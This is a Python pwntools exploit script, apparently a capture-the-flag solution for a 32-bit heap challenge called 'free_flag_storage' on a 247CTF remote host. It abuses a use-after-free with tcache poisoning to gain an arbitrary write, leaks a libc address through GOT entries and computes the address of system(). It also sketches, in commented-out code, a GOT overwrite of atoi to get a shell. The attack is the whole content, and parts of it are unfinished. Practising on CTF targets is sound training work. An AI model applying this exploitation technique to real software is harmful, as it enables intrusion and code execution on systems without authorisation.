#!/usr/bin/env python3
from pwn import *
import ctypes
from Crypto.Util.number import long_to_bytes
exe = ELF("./free_flag_storage_patched")
libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ["tmux", "splitw", "-vf","-p", "70"]
#context.terminal = ['gnome-terminal','-x']
context.log_level = "debug"
def conn():
    if args.LOCAL:
        # b = add, delete, edit
        # 0x9da0170, 0x9da01b0
    	r = gdb.debug(exe.path,gdbscript='''
            b *0x8048803 
            b *0x8048cae
            b *0x8048a31
            b *0x8048b02
            
        ''')
    elif args.PROCESS:
        r = process([exe.path])
    else:
        r = remote("0844b7b94621d805.247ctf.com", 50002)

    return r


def add(r, len, value, id, score):
    r.sendline(b'add')
    r.sendlineafter(b': ',len)
    r.sendlineafter(b'value:',value)
    r.sendlineafter(b'challenge_id: ',id)
    r.sendlineafter(b'score: ',score)
    
    
def delete(r, idx):
    r.sendline(b'delete')
    r.sendlineafter(b'to delete:',f'{idx}')

def edit(r, idx, value, id, score):
    r.sendline(b'edit')
    r.sendlineafter(b'edit:',f"{idx}")
    r.sendlineafter(b'):',value)
    r.sendlineafter(b'challenge_id: ',id)
    r.sendlineafter(b'score:',score)

def main():
    r = conn()
    puts_got = p32(exe.got.puts)
    puts_plt = p32(exe.plt.puts)
    atoi_got = p32(exe.got.atoi)
    flags_buffer = p32(0x804b04c)
    # good luck pwning :)
    add(r,"20","0","0","0")
    
    add(r,"20","0","0","0")
    # delete(r,0)
    # add(r,"20",flags_buffer,flags_buffer,flags_buffer) # flags points to same addr
    # r.interactive()
    

    delete(r,0)
    edit(r,0,flags_buffer,flags_buffer,flags_buffer) # arbitrary address is in tcache!!
    #r.interactive()
    add(r,puts_got,puts_got,puts_got,puts_got)   
    add(r,puts_got,puts_got,puts_got,puts_got)
    r.sendline("print") # score = libc leak
    

    # leak flag values
    r.recvuntil(b'{')
    value = r.recvuntil(b'}')[:-1]
    print("value: ",value)

    r.recvuntil(b'challenge_id: ')
    
    id = r.recvuntil(b',')[:-1].decode()
    print("id: ",id)

    r.recvuntil(b'score: ')
    leak = int(r.recvuntil(b')')[:-1].decode())
    leak = ctypes.c_uint32(leak).value
    print("leak: ",long_to_bytes(leak))

    libc.address = leak - libc.sym.atoi

    #print(libc.address)
    system = p32(libc.sym.system) 
    # overwrite atoi and put bin sh as input so -> add: atoi(/bin/sh)
    info("Leaked libc")
    #edit(r,0,value,id,system) 
    #edit(r,2,flags_buffer,system,system)


    #add(r,puts_got,puts_got,puts_got,puts_got)

    


    '''
    delete(r,0)
    #add(r,"20","0","0","0")
    r.sendline("print")
    #r.interactive()
    # next add, edit flag buffer
    add(r,"20",puts_got,puts_got,puts_got)
    '''
    r.interactive()

    '''

    delete(r,0)
    edit(r,0,atoi_got,atoi_got,atoi_got) # arbitrary address is in tcache!!
    #r.interactive()
    add(r,atoi_got,atoi_got,atoi_got,atoi_got)   
    add(r,"20",puts_got,puts_got,puts_got)

    '''

if __name__ == "__main__":
    main()
